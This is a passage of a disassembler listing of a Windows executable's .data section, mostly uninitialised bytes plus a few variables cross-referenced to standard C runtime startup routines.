.data:00405283                 db    ? ;
.data:00405284                 db    ? ;
.data:00405285                 db    ? ;
.data:00405286                 db    ? ;
.data:00405287                 db    ? ;
.data:00405288                 db    ? ;
.data:00405289                 db    ? ;
.data:0040528A                 db    ? ;
.data:0040528B                 db    ? ;
.data:0040528C                 db    ? ;
.data:0040528D                 db    ? ;
.data:0040528E                 db    ? ;
.data:0040528F                 db    ? ;
.data:00405290                 db    ? ;
.data:00405291                 db    ? ;
.data:00405292                 db    ? ;
.data:00405293                 db    ? ;
.data:00405294                 db    ? ;
.data:00405295                 db    ? ;
.data:00405296                 db    ? ;
.data:00405297                 db    ? ;
.data:00405298                 db    ? ;
.data:00405299                 db    ? ;
.data:0040529A                 db    ? ;
.data:0040529B                 db    ? ;
.data:0040529C                 db    ? ;
.data:0040529D                 db    ? ;
.data:0040529E                 db    ? ;
.data:0040529F                 db    ? ;
.data:004052A0                 db    ? ;
.data:004052A1                 db    ? ;
.data:004052A2                 db    ? ;
.data:004052A3                 db    ? ;
.data:004052A4                 db    ? ;
.data:004052A5                 db    ? ;
.data:004052A6                 db    ? ;
.data:004052A7                 db    ? ;
.data:004052A8                 db    ? ;
.data:004052A9                 db    ? ;
.data:004052AA                 db    ? ;
.data:004052AB                 db    ? ;
.data:004052AC                 db    ? ;
.data:004052AD                 db    ? ;
.data:004052AE                 db    ? ;
.data:004052AF                 db    ? ;
.data:004052B0                 db    ? ;
.data:004052B1                 db    ? ;
.data:004052B2                 db    ? ;
.data:004052B3                 db    ? ;
.data:004052B4                 db    ? ;
.data:004052B5                 db    ? ;
.data:004052B6                 db    ? ;
.data:004052B7                 db    ? ;
.data:004052B8                 db    ? ;
.data:004052B9                 db    ? ;
.data:004052BA                 db    ? ;
.data:004052BB                 db    ? ;
.data:004052BC                 db    ? ;
.data:004052BD                 db    ? ;
.data:004052BE                 db    ? ;
.data:004052BF                 db    ? ;
.data:004052C0                 db    ? ;
.data:004052C1                 db    ? ;
.data:004052C2                 db    ? ;
.data:004052C3                 db    ? ;
.data:004052C4                 db    ? ;
.data:004052C5                 db    ? ;
.data:004052C6                 db    ? ;
.data:004052C7                 db    ? ;
.data:004052C8                 db    ? ;
.data:004052C9                 db    ? ;
.data:004052CA                 db    ? ;
.data:004052CB                 db    ? ;
.data:004052CC                 db    ? ;
.data:004052CD                 db    ? ;
.data:004052CE                 db    ? ;
.data:004052CF                 db    ? ;
.data:004052D0                 db    ? ;
.data:004052D1                 db    ? ;
.data:004052D2                 db    ? ;
.data:004052D3                 db    ? ;
.data:004052D4                 db    ? ;
.data:004052D5                 db    ? ;
.data:004052D6                 db    ? ;
.data:004052D7                 db    ? ;
.data:004052D8                 db    ? ;
.data:004052D9                 db    ? ;
.data:004052DA                 db    ? ;
.data:004052DB                 db    ? ;
.data:004052DC                 db    ? ;
.data:004052DD                 db    ? ;
.data:004052DE                 db    ? ;
.data:004052DF                 db    ? ;
.data:004052E0                 db    ? ;
.data:004052E1                 db    ? ;
.data:004052E2                 db    ? ;
.data:004052E3                 db    ? ;
.data:004052E4                 db    ? ;
.data:004052E5                 db    ? ;
.data:004052E6                 db    ? ;
.data:004052E7                 db    ? ;
.data:004052E8                 db    ? ;
.data:004052E9                 db    ? ;
.data:004052EA                 db    ? ;
.data:004052EB                 db    ? ;
.data:004052EC                 db    ? ;
.data:004052ED                 db    ? ;
.data:004052EE                 db    ? ;
.data:004052EF                 db    ? ;
.data:004052F0                 db    ? ;
.data:004052F1                 db    ? ;
.data:004052F2                 db    ? ;
.data:004052F3                 db    ? ;
.data:004052F4                 db    ? ;
.data:004052F5                 db    ? ;
.data:004052F6                 db    ? ;
.data:004052F7                 db    ? ;
.data:004052F8                 db    ? ;
.data:004052F9                 db    ? ;
.data:004052FA                 db    ? ;
.data:004052FB                 db    ? ;
.data:004052FC                 db    ? ;
.data:004052FD                 db    ? ;
.data:004052FE                 db    ? ;
.data:004052FF                 db    ? ;
.data:00405300                 db    ? ;
.data:00405301                 db    ? ;
.data:00405302                 db    ? ;
.data:00405303                 db    ? ;
.data:00405304                 db    ? ;
.data:00405305                 db    ? ;
.data:00405306                 db    ? ;
.data:00405307                 db    ? ;
.data:00405308                 db    ? ;
.data:00405309                 db    ? ;
.data:0040530A                 db    ? ;
.data:0040530B                 db    ? ;
.data:0040530C                 db    ? ;
.data:0040530D                 db    ? ;
.data:0040530E                 db    ? ;
.data:0040530F                 db    ? ;
.data:00405310                 db    ? ;
.data:00405311                 db    ? ;
.data:00405312                 db    ? ;
.data:00405313                 db    ? ;
.data:00405314                 db    ? ;
.data:00405315                 db    ? ;
.data:00405316                 db    ? ;
.data:00405317                 db    ? ;
.data:00405318                 db    ? ;
.data:00405319                 db    ? ;
.data:0040531A                 db    ? ;
.data:0040531B                 db    ? ;
.data:0040531C                 db    ? ;
.data:0040531D                 db    ? ;
.data:0040531E                 db    ? ;
.data:0040531F                 db    ? ;
.data:00405320                 db    ? ;
.data:00405321                 db    ? ;
.data:00405322                 db    ? ;
.data:00405323                 db    ? ;
.data:00405324                 db    ? ;
.data:00405325                 db    ? ;
.data:00405326                 db    ? ;
.data:00405327                 db    ? ;
.data:00405328                 db    ? ;
.data:00405329                 db    ? ;
.data:0040532A                 db    ? ;
.data:0040532B                 db    ? ;
.data:0040532C                 db    ? ;
.data:0040532D                 db    ? ;
.data:0040532E                 db    ? ;
.data:0040532F                 db    ? ;
.data:00405330                 db    ? ;
.data:00405331                 db    ? ;
.data:00405332                 db    ? ;
.data:00405333                 db    ? ;
.data:00405334                 db    ? ;
.data:00405335                 db    ? ;
.data:00405336                 db    ? ;
.data:00405337                 db    ? ;
.data:00405338                 db    ? ;
.data:00405339                 db    ? ;
.data:0040533A                 db    ? ;
.data:0040533B                 db    ? ;
.data:0040533C                 db    ? ;
.data:0040533D                 db    ? ;
.data:0040533E                 db    ? ;
.data:0040533F                 db    ? ;
.data:00405340                 db    ? ;
.data:00405341                 db    ? ;
.data:00405342                 db    ? ;
.data:00405343                 db    ? ;
.data:00405344                 db    ? ;
.data:00405345                 db    ? ;
.data:00405346                 db    ? ;
.data:00405347                 db    ? ;
.data:00405348                 db    ? ;
.data:00405349                 db    ? ;
.data:0040534A                 db    ? ;
.data:0040534B                 db    ? ;
.data:0040534C                 db    ? ;
.data:0040534D                 db    ? ;
.data:0040534E                 db    ? ;
.data:0040534F                 db    ? ;
.data:00405350                 db    ? ;
.data:00405351                 db    ? ;
.data:00405352                 db    ? ;
.data:00405353                 db    ? ;
.data:00405354                 db    ? ;
.data:00405355                 db    ? ;
.data:00405356                 db    ? ;
.data:00405357                 db    ? ;
.data:00405358                 db    ? ;
.data:00405359                 db    ? ;
.data:0040535A                 db    ? ;
.data:0040535B                 db    ? ;
.data:0040535C                 db    ? ;
.data:0040535D                 db    ? ;
.data:0040535E                 db    ? ;
.data:0040535F                 db    ? ;
.data:00405360                 db    ? ;
.data:00405361                 db    ? ;
.data:00405362                 db    ? ;
.data:00405363                 db    ? ;
.data:00405364                 db    ? ;
.data:00405365                 db    ? ;
.data:00405366                 db    ? ;
.data:00405367                 db    ? ;
.data:00405368                 db    ? ;
.data:00405369                 db    ? ;
.data:0040536A                 db    ? ;
.data:0040536B                 db    ? ;
.data:0040536C                 db    ? ;
.data:0040536D                 db    ? ;
.data:0040536E                 db    ? ;
.data:0040536F                 db    ? ;
.data:00405370                 db    ? ;
.data:00405371                 db    ? ;
.data:00405372                 db    ? ;
.data:00405373                 db    ? ;
.data:00405374                 db    ? ;
.data:00405375                 db    ? ;
.data:00405376                 db    ? ;
.data:00405377                 db    ? ;
.data:00405378                 db    ? ;
.data:00405379                 db    ? ;
.data:0040537A                 db    ? ;
.data:0040537B                 db    ? ;
.data:0040537C dword_40537C    dd ?                    ; DATA XREF: __scrt_common_main_seh(void)+2D↑r
.data:0040537C                                         ; __scrt_common_main_seh(void)+41↑w ...
.data:00405380 unk_405380      db    ? ;               ; DATA XREF: ___scrt_acquire_startup_lock+10↑o
.data:00405380                                         ; ___scrt_release_startup_lock+14↑o
.data:00405381                 db    ? ;
.data:00405382                 db    ? ;
.data:00405383                 db    ? ;
.data:00405384 byte_405384     db ?                    ; DATA XREF: ___scrt_initialize_crt+9↑w
.data:00405384                                         ; ___scrt_uninitialize_crt+3↑r
.data:00405385 byte_405385     db ?                    ; DATA XREF: ___scrt_initialize_onexit_tables+3↑r
.data:00405385                                         ; ___scrt_initialize_onexit_tables:loc_401838↑w
.data:00405386                 align 4
.data:00405388 ; _onexit_table_t Table
.data:00405388 Table           _onexit_table_t <?>     ; DATA XREF: ___scrt_initialize_onexit_tables+2A↑o
.data:00405388                                         ; ___scrt_initialize_onexit_tables+4F↑w ...
.data:00405394 ; _onexit_table_t stru_405394
.data:00405394 stru_405394     _onexit_table_t <?>     ; DATA XREF: ___scrt_initialize_onexit_tables+39↑o
.data:00405394                                         ; ___scrt_initialize_onexit_tables+61↑w ...
.data:004053A0 ; union _SLIST_HEADER ListHead
.data:004053A0 ListHead        _SLIST_HEADER <?>       ; DATA XREF: sub_401A0C↑o
.data:004053A8 unk_4053A8      db    ? ;               ; DATA XREF: sub_401A3F↑o
.data:004053A9                 db    ? ;
.data:004053AA                 db    ? ;
.data:004053AB                 db    ? ;
.data:004053AC                 db    ? ;
.data:004053AD                 db    ? ;
.data:004053AE                 db    ? ;
.data:004053AF                 db    ? ;
.data:004053B0 dword_4053B0    dd ?                    ; DATA XREF: sub_401C38↑w
.data:004053B4 dword_4053B4    dd ?                    ; DATA XREF: sub_401D14+2EB↑w
.data:004053B8 dword_4053B8    dd ?                    ; DATA XREF: sub_401D14+3↑w
.data:004053B8                                         ; sub_401D14+17A↑w ...
.data:004053BC dword_4053BC    dd ?                    ; DATA XREF: sub_401D14:loc_401DCF↑w
.data:004053BC                                         ; sub_401D14+10A↑w
.data:004053C0 unk_4053C0      db    ? ;               ; DATA XREF: sub_401000↑o
.data:004053C1                 db    ? ;
.data:004053C2                 db    ? ;
.data:004053C3                 db    ? ;
.data:004053C4                 db    ? ;
.data:004053C5                 db    ? ;
.data:004053C6                 db    ? ;
.data:004053C7                 db    ? ;
.data:004053C8 unk_4053C8      db    ? ;               ; DATA XREF: sub_401A74↑o
.data:004053C9                 db    ? ;
.data:004053CA                 db    ? ;
.data:004053CB                 db    ? ;
.data:004053CC unk_4053CC      db    ? ;               ; DATA XREF: sub_401A6E↑o
.data:004053CD                 db    ? ;
.data:004053CE                 db    ? ;
.data:004053CF                 db    ? ;
.data:004053D0                 db    ? ;
.data:004053D1                 db    ? ;
.data:004053D2                 db    ? ;
.data:004053D3                 db    ? ;
.data:004053D4                 db    ? ;
.data:004053D5                 db    ? ;
.data:004053D6                 db    ? ;
.data:004053D7                 db    ? ;
.data:004053D8                 db    ? ;
.data:004053D9                 db    ? ;
.data:004053DA                 db    ? ;
.data:004053DB                 db    ? ;
.data:004053DC                 db    ? ;
.data:004053DD                 db    ? ;
.data:004053DE                 db    ? ;
.data:004053DF                 db    ? ;
.data:004053E0                 db    ? ;
.data:004053E1                 db    ? ;
.data:004053E2                 db    ? ;
.data:004053E3                 db    ? ;
.data:004053E4                 db    ? ;
.data:004053E5                 db    ? ;
.data:004053E6                 db    ? ;
.data:004053E7                 db    ? ;
.data:004053E8                 db    ? ;
.data:004053E9                 db    ? ;
.data:004053EA                 db    ? ;
.data:004053EB                 db    ? ;
.data:004053EC                 db    ? ;
.data:004053ED                 db    ? ;
.data:004053EE                 db    ? ;
.data:004053EF                 db    ? ;
.data:004053F0                 db    ? ;
.data:004053F1                 db    ? ;
.data:004053F2                 db    ? ;
.data:004053F3                 db    ? ;
.data:004053F4                 db    ? ;
.data:004053F5                 db    ? ;
.data:004053F6                 db    ? ;
.data:004053F7                 db    ? ;
.data:004053F8                 db    ? ;
.data:004053F9                 db    ? ;
.data:004053FA                 db    ? ;
.data:004053FB                 db    ? ;
.data:004053FC                 db    ? ;
.data:004053FD                 db    ? ;
.data:004053FE                 db    ? ;
.data:004053FF                 db    ? ;
.data:00405400                 db    ? ;
.data:00405401                 db    ? ;
.data:00405402                 db    ? ;
.data:00405403                 db    ? ;
.data:00405404                 db    ? ;
.data:00405405                 db    ? ;
.data:00405406                 db    ? ;
.data:00405407                 db    ? ;
.data:00405408                 db    ? ;
.data:00405409                 db    ? ;
.data:0040540A                 db    ? ;
.data:0040540B                 db    ? ;
.data:0040540C                 db    ? ;
.data:0040540D                 db    ? ;
.data:0040540E                 db    ? ;
.data:0040540F                 db    ? ;
.data:00405410                 db    ? ;
.data:00405411                 db    ? ;
.data:00405412                 db    ? ;
.data:00405413                 db    ? ;
.data:00405414                 db    ? ;
.data:00405415                 db    ? ;
.data:00405416                 db    ? ;
.data:00405417                 db    ? ;
.data:00405418                 db    ? ;
.data:00405419                 db    ? ;
.data:0040541A                 db    ? ;
.data:0040541B                 db    ? ;
.data:0040541C                 db    ? ;
.data:0040541D                 db    ? ;
.data:0040541E                 db    ? ;
.data:0040541F                 db    ? ;
.data:00405420                 db    ? ;
.data:00405421                 db    ? ;
.data:00405422                 db    ? ;
.data:00405423                 db    ? ;
.data:00405424                 db    ? ;
.data:00405425                 db    ? ;
.data:00405426                 db    ? ;
.data:00405427                 db    ? ;
.data:00405428                 db    ? ;
.data:00405429                 db    ? ;
.data:0040542A                 db    ? ;
.data:0040542B                 db    ? ;
.data:0040542C                 db    ? ;
.data:0040542D                 db    ? ;
.data:0040542E                 db    ? ;
.data:0040542F                 db    ? ;
.data:00405430                 db    ? ;
.data:00405431                 db    ? ;
.data:00405432                 db    ? ;
.data:00405433                 db    ? ;
.data:00405434                 db    ? ;
.data:00405435                 db    ? ;
.data:00405436                 db    ? ;
.data:00405437                 db    ? ;
.data:00405438                 db    ? ;
.data:00405439                 db    ? ;
.data:0040543A                 db    ? ;
.data:0040543B                 db    ? ;
.data:0040543C                 db    ? ;
.data:0040543D                 db    ? ;
.data:0040543E                 db    ? ;
.data:0040543F                 db    ? ;
.data:00405440                 db    ? ;
.data:00405441                 db    ? ;
.data:00405442                 db    ? ;
.data:00405443                 db    ? ;
.data:00405444                 db    ? ;
.data:00405445                 db    ? ;
.data:00405446                 db    ? ;
.data:00405447                 db    ? ;
.data:00405448                 db    ? ;
.data:00405449                 db    ? ;
.data:0040544A                 db    ? ;
.data:0040544B                 db    ? ;
.data:0040544C                 db    ? ;
.data:0040544D                 db    ? ;
.data:0040544E                 db    ? ;
.data:0040544F                 db    ? ;
.data:00405450                 db    ? ;
.data:00405451                 db    ? ;
.data:00405452                 db    ? ;
.data:00405453                 db    ? ;
.data:00405454                 db    ? ;
.data:00405455                 db    ? ;
.data:00405456                 db    ? ;
.data:00405457                 db    ? ;
.data:00405458                 db    ? ;
.data:00405459                 db    ? ;
.data:0040545A                 db    ? ;
.data:0040545B                 db    ? ;
.data:0040545C                 db    ? ;
.data:0040545D                 db    ? ;
.data:0040545E                 db    ? ;
.data:0040545F                 db    ? ;
.data:00405460                 db    ? ;
.data:00405461                 db    ? ;
.data:00405462                 db    ? ;
.data:00405463                 db    ? ;
.data:00405464                 db    ? ;
.data:00405465                 db    ? ;
.data:00405466                 db    ? ;
.data:00405467                 db    ? ;
.data:00405468                 db    ? ;
.data:00405469                 db    ? ;
.data:0040546A                 db    ? ;
.data:0040546B                 db    ? ;
.data:0040546C                 db    ? ;
.data:0040546D                 db    ? ;
.data:0040546E                 db    ? ;
.data:0040546F                 db    ? ;
.data:00405470                 db    ? ;
.data:00405471                 db    ? ;
.data:00405472                 db    ? ;
.data:00405473                 db    ? ;
.data:00405474                 db    ? ;
.data:00405475                 db    ? ;
.data:00405476                 db    ? ;
.data:00405477                 db    ? ;
.data:00405478                 db    ? ;
.data:00405479                 db    ? ;
.data:0040547A                 db    ? ;
.data:0040547B                 db    ? ;
.data:0040547C                 db    ? ;
.data:0040547D                 db    ? ;
.data:0040547E                 db    ? ;
.data:0040547F                 db    ? ;
.data:00405480                 db    ? ;
.data:00405481                 db    ? ;
.data:00405482                 db    ? ;
.data:00405483                 db    ? ;
.data:00405484                 db    ? ;
.data:00405485                 db    ? ;
.data:00405486                 db    ? ;
.data:00405487                 db    ? ;
.data:00405488                 db    ? ;
.data:00405489                 db    ? ;
.data:0040548A                 db    ? ;
.data:0040548B                 db    ? ;
.data:0040548C                 db    ? ;
.data:0040548D                 db    ? ;
.data:0040548E                 db    ? ;
.data:0040548F                 db    ? ;
.data:00405490                 db    ? ;
.data:00405491                 db    ? ;
.data:00405492                 db    ? ;
.data:00405493                 db    ? ;
.data:00405494                 db    ? ;
.data:00405495                 db    ? ;
.data:00405496                 db    ? ;
.data:00405497                 db    ? ;
.data:00405498                 db    ? ;
.data:00405499                 db    ? ;
.data:0040549A                 db    ? ;
.data:0040549B                 db    ? ;
.data:0040549C                 db    ? ;
.data:0040549D                 db    ? ;
.data:0040549E                 db    ? ;
.data:0040549F                 db    ? ;
.data:004054A0                 db    ? ;
.data:004054A1                 db    ? ;
.data:004054A2                 db    ? ;
.data:004054A3                 db    ? ;
.data:004054A4                 db    ? ;
.data:004054A5                 db    ? ;
.data:004054A6                 db    ? ;
.data:004054A7                 db    ? ;
.data:004054A8                 db    ? ;
.data:004054A9                 db    ? ;
.data:004054AA                 db    ? ;
.data:004054AB                 db    ? ;
.data:004054AC                 db    ? ;
.data:004054AD                 db    ? ;
.data:004054AE                 db    ? ;
.data:004054AF                 db    ? ;
.data:004054B0                 db    ? ;
.data:004054B1                 db    ? ;
.data:004054B2                 db    ? ;
.data:004054B3                 db    ? ;
.data:004054B4                 db    ? ;
.data:004054B5                 db    ? ;
.data:004054B6                 db    ? ;
.data:004054B7                 db    ? ;
.data:004054B8                 db    ? ;
.data:004054B9                 db    ? ;
.data:004054BA                 db    ? ;
.data:004054BB                 db    ? ;
.data:004054BC                 db    ? ;
.data:004054BD                 db    ? ;
.data:004054BE                 db    ? ;
.data:004054BF                 db    ? ;
.data:004054C0                 db    ? ;
.data:004054C1                 db    ? ;
.data:004054C2                 db    ? ;
.data:004054C3                 db    ? ;
.data:004054C4                 db    ? ;
.data:004054C5                 db    ? ;
.data:004054C6                 db    ? ;
.data:004054C7                 db    ? ;
.data:004054C8                 db    ? ;
.data:004054C9                 db    ? ;
.data:004054CA                 db    ? ;
.data:004054CB                 db    ? ;
.data:004054CC                 db    ? ;
.data:004054CD                 db    ? ;
.data:004054CE                 db    ? ;
.data:004054CF                 db    ? ;
.data:004054D0                 db    ? ;
.data:004054D1                 db    ? ;
.data:004054D2                 db    ? ;
.data:004054D3                 db    ? ;
.data:004054D4                 db    ? ;
.data:004054D5                 db    ? ;
.data:004054D6                 db    ? ;
.data:004054D7                 db    ? ;
.data:004054D8                 db    ? ;
.data:004054D9                 db    ? ;
.data:004054DA                 db    ? ;
.data:004054DB                 db    ? ;
.data:004054DC                 db    ? ;
.data:004054DD                 db    ? ;
.data:004054DE                 db    ? ;
.data:004054DF                 db    ? ;
.data:004054E0                 db    ? ;
.data:004054E1                 db    ? ;
.data:004054E2                 db    ? ;
.data:004054E3                 db    ? ;
.data:004054E4                 db    ? ;
.data:004054E5                 db    ? ;
.data:004054E6                 db    ? ;
.data:004054E7                 db    ? ;
.data:004054E8                 db    ? ;
.data:004054E9                 db    ? ;
.data:004054EA                 db    ? ;
.data:004054EB                 db    ? ;
.data:004054EC                 db    ? ;
.data:004054ED                 db    ? ;
.data:004054EE                 db    ? ;
.data:004054EF                 db    ? ;
.data:004054F0                 db    ? ;
.data:004054F1                 db    ? ;
.data:004054F2                 db    ? ;
.data:004054F3                 db    ? ;
.data:004054F4                 db    ? ;
.data:004054F5                 db    ? ;
.data:004054F6                 db    ? ;
.data:004054F7                 db    ? ;
.data:004054F8                 db    ? ;
.data:004054F9                 db    ? ;
.data:004054FA                 db    ? ;
.data:004054FB                 db    ? ;
.data:004054FC                 db    ? ;
.data:004054FD                 db    ? ;
.data:004054FE                 db    ? ;
.data:004054FF                 db    ? ;
.data:00405500                 db    ? ;
.data:00405501                 db    ? ;
.data:00405502                 db    ? ;
.data:00405503                 db    ? ;
.data:00405504                 db    ? ;
.data:00405505                 db    ? ;
.data:00405506                 db    ? ;
.data:00405507                 db    ? ;
.data:00405508                 db    ? ;
.data:00405509                 db    ? ;
.data:0040550A                 db    ? ;
.data:0040550B                 db    ? ;
.data:0040550C                 db    ? ;
.data:0040550D                 db    ? ;
.data:0040550E                 db    ? ;
.data:0040550F                 db    ? ;
.data:00405510                 db    ? ;
.data:00405511                 db    ? ;
.data:00405512                 db    ? ;
.data:00405513                 db    ? ;
.data:00405514                 db    ? ;
.data:00405515                 db    ? ;
.data:00405516                 db    ? ;
.data:00405517                 db    ? ;
.data:00405518                 db    ? ;
.data:00405519                 db    ? ;
.data:0040551A                 db    ? ;
.data:0040551B                 db    ? ;
.data:0040551C                 db    ? ;
.data:0040551D                 db    ? ;
.data:0040551E                 db    ? ;
.data:0040551F                 db    ? ;
.data:00405520                 db    ? ;
.data:00405521                 db    ? ;
.data:00405522                 db    ? ;
.data:00405523                 db    ? ;
.data:00405524                 db    ? ;
.data:00405525                 db    ? ;
.data:00405526                 db    ? ;
.data:00405527                 db    ? ;
.data:00405528                 db    ? ;
.data:00405529                 db    ? ;
.data:0040552A                 db    ? ;
.data:0040552B                 db    ? ;
.data:0040552C                 db    ? ;
.data:0040552D                 db    ? ;
.data:0040552E                 db    ? ;
.data:0040552F                 db    ? ;
.data:00405530                 db    ? ;
.data:00405531                 db    ? ;
.data:00405532                 db    ? ;
.data:00405533                 db    ? ;
.data:00405534                 db    ? ;
.data:00405535                 db    ? ;
.data:00405536                 db    ? ;
.data:00405537                 db    ? ;
.data:00405538                 db    ? ;
.data:00405539                 db    ? ;
.data:0040553A                 db    ? ;
.data:0040553B                 db    ? ;
.data:0040553C                 db    ? ;
.data:0040553D                 db    ? ;
.data:0040553E                 db    ? ;
.data:0040553F                 db    ? ;
.data:00405540                 db    ? ;
.data:00405541                 db    ? ;
.data:00405542                 db    ? ;
.data:00405543                 db    ? ;
.data:00405544                 db    ? ;
.data:00405545                 db    ? ;
.data:00405546                 db    ? ;
.data:00405547                 db    ? ;
.data:00405548                 db    ? ;
.data:00405549                 db    ? ;
.data:0040554A                 db    ? ;
.data:0040554B                 db    ? ;
.data:0040554C                 db    ? ;
.data:0040554D                 db    ? ;
.data:0040554E                 db    ? ;
.data:0040554F                 db    ? ;
.data:00405550                 db    ? ;
.data:00405551                 db    ? ;
.data:00405552                 db    ? ;
.data:00405553                 db    ? ;
.data:00405554                 db    ? ;
.data:00405555                 db    ? ;
.data:00405556                 db    ? ;
.data:00405557                 db    ? ;
.data:00405558                 db    ? ;
.data:00405559                 db    ? ;
.data:0040555A                 db    ? ;
.data:0040555B                 db    ? ;
.data:0040555C                 db    ? ;
.data:0040555D                 db    ? ;
.data:0040555E                 db    ? ;
.data:0040555F                 db    ? ;
.data:00405560                 db    ? ;
.data:00405561                 db    ? ;
.data:00405562                 db    ? ;
.data:00405563                 db    ? ;
.data:00405564                 db    ? ;
.data:00405565                 db    ? ;
.data:00405566                 db    ? ;
.data:00405567                 db    ? ;
.data:00405568                 db    ? ;
.data:00405569                 db    ? ;
.data:0040556A                 db    ? ;
.data:0040556B                 db    ? ;
.data:0040556C                 db    ? ;
.data:0040556D                 db    ? ;
.data:0040556E                 db    ? ;
.data:0040556F                 db    ? ;
.data:00405570                 db    ? ;
.data:00405571                 db    ? ;
.data:00405572                 db    ? ;
.data:00405573                 db    ? ;
.data:00405574                 db    ? ;
.data:00405575                 db    ? ;
.data:00405576                 db    ? ;
.data:00405577                 db    ? ;
.data:00405578                 db    ? ;
.data:00405579                 db    ? ;
.data:0040557A                 db    ? ;
.data:0040557B                 db    ? ;
.data:0040557C                 db    ? ;
.data:0040557D                 db    ? ;
.data:0040557E                 db    ? ;
.data:0040557F                 db    ? ;
.data:00405580                 db    ? ;
.data:00405581                 db    ? ;
.data:00405582                 db    ? ;
.data:00405583                 db    ? ;
.data:00405584                 db    ? ;
.data:00405585                 db    ? ;
.data:00405586                 db    ? ;
.data:00405587                 db    ? ;
.data:00405588                 db    ? ;
.data:00405589                 db    ? ;
.data:0040558A                 db    ? ;
.data:0040558B                 db    ? ;
.data:0040558C                 db    ? ;
.data:0040558D                 db    ? ;
.data:0040558E                 db    ? ;
.data:0040558F                 db    ? ;
.data:00405590                 db    ? ;
.data:00405591                 db    ? ;
.data:00405592                 db    ? ;
.data:00405593                 db    ? ;
.data:00405594                 db    ? ;
.data:00405595                 db    ? ;
.data:00405596                 db    ? ;
.data:00405597                 db    ? ;
.data:00405598                 db    ? ;
.data:00405599                 db    ? ;
.data:0040559A                 db    ? ;
.data:0040559B                 db    ? ;
.data:0040559C                 db    ? ;
.data:0040559D                 db    ? ;
.data:0040559E                 db    ? ;
.data:0040559F                 db    ? ;
.data:004055A0                 db    ? ;
.data:004055A1                 db    ? ;
.data:004055A2                 db    ? ;
.data:004055A3                 db    ? ;
.data:004055A4                 db    ? ;
.data:004055A5                 db    ? ;
.data:004055A6                 db    ? ;
.data:004055A7                 db    ? ;
.data:004055A8                 db    ? ;
.data:004055A9                 db    ? ;
.data:004055AA                 db    ? ;
.data:004055AB                 db    ? ;
.data:004055AC                 db    ? ;
.data:004055AD                 db    ? ;
.data:004055AE                 db    ? ;
.data:004055AF                 db    ? ;
.data:004055B0                 db    ? ;
.data:004055B1                 db    ? ;
.data:004055B2                 db    ? ;
.data:004055B3                 db    ? ;
.data:004055B4                 db    ? ;
.data:004055B5                 db    ? ;
.data:004055B6                 db    ? ;
.data:004055B7                 db    ? ;
.data:004055B8                 db    ? ;
.data:004055B9                 db    ? ;
.data:004055BA                 db    ? ;
.data:004055BB                 db    ? ;
.data:004055BC                 db    ? ;
.data:004055BD                 db    ? ;
.data:004055BE                 db    ? ;
.data:004055BF                 db    ? ;
.data:004055C0                 db    ? ;
.data:004055C1                 db    ? ;
.data:004055C2                 db    ? ;
.data:004055C3                 db    ? ;
.data:004055C4                 db    ? ;
.data:004055C5                 db    ? ;
.data:004055C6                 db    ? ;
.data:004055C7                 db    ? ;
.data:004055C8                 db    ? ;
.data:004055C9                 db    ? ;
.data:004055CA                 db    ? ;
.data:004055CB                 db    ? ;
.data:004055CC                 db    ? ;
.data:004055CD                 db    ? ;
.data:004055CE                 db    ? ;
.data:004055CF                 db    ? ;
.data:004055D0                 db    ? ;
.data:004055D1                 db    ? ;
.data:004055D2                 db    ? ;
.data:004055D3                 db    ? ;
.data:004055D4                 db    ? ;
.data:004055D5                 db    ? ;
.data:004055D6                 db    ? ;
.data:004055D7                 db    ? ;
.data:004055D8                 db    ? ;
.data:004055D9                 db    ? ;
.data:004055DA                 db    ? ;
.data:004055DB                 db    ? ;
.data:004055DC                 db    ? ;
.data:004055DD                 db    ? ;
.data:004055DE                 db    ? ;
.data:004055DF                 db    ? ;
.data:004055E0                 db    ? ;
.data:004055E1                 db    ? ;
.data:004055E2                 db    ? ;
.data:004055E3                 db    ? ;
.data:004055E4                 db    ? ;
.data:004055E5                 db    ? ;
.data:004055E6                 db    ? ;
.data:004055E7                 db    ? ;
.data:004055E8                 db    ? ;
.data:004055E9                 db    ? ;
.data:004055EA                 db    ? ;
.data:004055EB                 db    ? ;
.data:004055EC                 db    ? ;
.data:004055ED                 db    ? ;
.data:004055EE                 db    ? ;
.data:004055EF                 db    ? ;
.data:004055F0                 db    ? ;
.data:004055F1                 db    ? ;
.data:004055F2                 db    ? ;
.data:004055F3                 db    ? ;
.data:004055F4                 db    ? ;
.data:004055F5                 db    ? ;
.data:004055F6                 db    ? ;
.data:004055F7                 db    ? ;
.data:004055F8                 db    ? ;
.data:004055F9                 db    ? ;
.data:004055FA                 db    ? ;
.data:004055FB                 db    ? ;
.data:004055FC                 db    ? ;
.data:004055FD                 db    ? ;
.data:004055FE                 db    ? ;
.data:004055FF                 db    ? ;
.data:00405600                 db    ? ;
.data:00405601                 db    ? ;
.data:00405602                 db    ? ;
.data:00405603                 db    ? ;
.data:00405604                 db    ? ;
.data:00405605                 db    ? ;
.data:00405606                 db    ? ;
.data:00405607                 db    ? ;
.data:00405608                 db    ? ;
.data:00405609                 db    ? ;
.data:0040560A                 db    ? ;
.data:0040560B                 db    ? ;
.data:0040560C                 db    ? ;
.data:0040560D                 db    ? ;
.data:0040560E                 db    ? ;
.data:0040560F                 db    ? ;
.data:00405610                 db    ? ;
.data:00405611                 db    ? ;
.data:00405612                 db    ? ;
.data:00405613                 db    ? ;
.data:00405614                 db    ? ;
.data:00405615                 db    ? ;
.data:00405616                 db    ? ;
.data:00405617                 db    ? ;
.data:00405618                 db    ? ;
.data:00405619                 db    ? ;
.data:0040561A                 db    ? ;
.data:0040561B                 db    ? ;
.data:0040561C                 db    ? ;
.data:0040561D                 db    ? ;
.data:0040561E                 db    ? ;
.data:0040561F                 db    ? ;
.data:00405620                 db    ? ;
.data:00405621                 db    ? ;
.data:00405622                 db    ? ;
.data:00405623                 db    ? ;
.data:00405624                 db    ? ;
.data:00405625                 db    ? ;
.data:00405626                 db    ? ;
.data:00405627                 db    ? ;
.data:00405628                 db    ? ;
.data:00405629                 db    ? ;
.data:0040562A                 db    ? ;
.data:0040562B                 db    ? ;
.data:0040562C                 db    ? ;
.data:0040562D                 db    ? ;
.data:0040562E                 db    ? ;
.data:0040562F                 db    ? ;
.data:00405630                 db    ? ;
.data:00405631                 db    ? ;
.data:00405632                 db    ? ;
.data:00405633                 db    ? ;
.data:00405634                 db    ? ;
.data:00405635                 db    ? ;
.data:00405636                 db    ? ;
.data:00405637                 db    ? ;
.data:00405638                 db    ? ;
.data:00405639                 db    ? ;
.data:0040563A                 db    ? ;
.data:0040563B                 db    ? ;
.data:0040563C                 db    ? ;
.data:0040563D                 db    ? ;
